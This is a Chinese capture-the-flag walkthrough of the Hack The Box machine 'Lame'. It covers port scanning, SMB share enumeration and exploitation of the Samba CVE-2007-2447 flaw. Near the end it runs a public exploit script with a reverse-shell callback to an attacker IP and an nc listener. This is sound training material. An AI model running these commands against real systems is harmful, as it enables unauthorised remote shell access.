# Lame

> SAMBA --> SMB 服务
>
> CVE2007 2447

1.  先使用 NMAP 扫描

    ```shell
    # 对 TCP 端口进行扫描
    nmap -sTC -p- --min-rate 1000 10.10.10.3
        PORT     STATE SERVICE
        21/tcp   open  ftp
            |_ftp-anon: Anonymous FTP login allowed (FTP code 230)  # 运行 FTP 匿名者登陆
        22/tcp   open  ssh  # 我们没有账户和密码，所以我们需要先获取这些信息
            | ssh-hostkey: 
            |   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
            |_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
        139/tcp  open  netbios-ssn
        445/tcp  open  microsoft-ds
        3632/tcp open  distccd
        
    # 对 UDP 端口进行扫描
    sudo nmap -sUC -p- --min-rate 1000 10.10.10.3
    	PORT     STATE  SERVICE
        22/udp   closed ssh
        139/udp  closed netbios-ssn
        445/udp  closed microsoft-ds
        3632/udp closed distcc
    	
    	
    # 对扫描的 TCP 端口进行探测
    nmap -sVC -p 21 22 139 445 3632 10.10.10.3
        PORT   STATE SERVICE VERSION
        21/tcp open  ftp     vsftpd 2.3.4
        22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
        | ssh-hostkey:
        |   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
        |_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
        139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
        445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
        3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
        Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
    ```
2.  FTP 服务

    > FTP 允许使用 匿名者 身份进行登陆

    ```shell
    # 登陆 FTP 服务，但是没有任何数据
    ftp 10.10.10.3

    # 检查得到的 FTP 服务应用存在后门， 找到漏洞，但是无法使用
    ```
3.  SSH 服务

    > 没有相关的凭据无法登陆
4.  SMB 服务

    ```shell
    # 枚举出所有的 SMB 目录
    smbmap -H 10.10.10.3
        Disk        Permissions	Comment
    	----        -----------	-------
    	print$      NO ACCESS	Printer Drivers
    	tmp         READ, WRITE	oh noes!
    	opt         NO ACCESS	
    	IPC$        NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
    	ADMIN$      NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))

    # 报错原因是 版本过低，我们需要让客户端可以和低版本服务端连接
    smbclient -N //10.10.10.3/tmp

    # 客户端连接，后面设置是为了让 SMB 客户端可以与旧版本的 SMB 服务连接，连接后也是没有任何的数据
    smbclient -N //10.10.10.3/tmp --option='client min protocol=NT1'

    # 建立连接 第一种方法


    # 建立连接 第二种方法

    # 我们得到 samba 的版本为 3.0.2 在网上进行相关的搜索后，得到相关的漏洞
    git clone https://github.com/amriunix/CVE-2007-2447.git
    sudo pip3 install pysmb
    # 执行命令
    python3 usermap_script.py 10.10.10.3 139 10.10.14.10 4444
    # 监听
    nc -lvnp 4444
    ```

> 参考文章
>
> * [HTB: Lame](https://0xdf.gitlab.io/2020/04/07/htb-lame.html)
